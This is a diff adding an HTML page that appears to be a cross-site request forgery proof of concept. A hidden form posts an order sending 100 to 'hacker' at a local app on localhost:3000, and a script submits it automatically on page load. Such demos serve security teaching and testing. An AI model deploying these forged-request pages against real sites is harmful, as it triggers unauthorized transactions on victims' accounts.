@@ -1,0 +1,11 @@
+<html>
+  <body>
+    <form action="http://localhost:3000/order" method="POST">
+      <input type="hidden" name="recipient" value="hacker" />
+      <input type="hidden" name="amount" value="100" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html> 
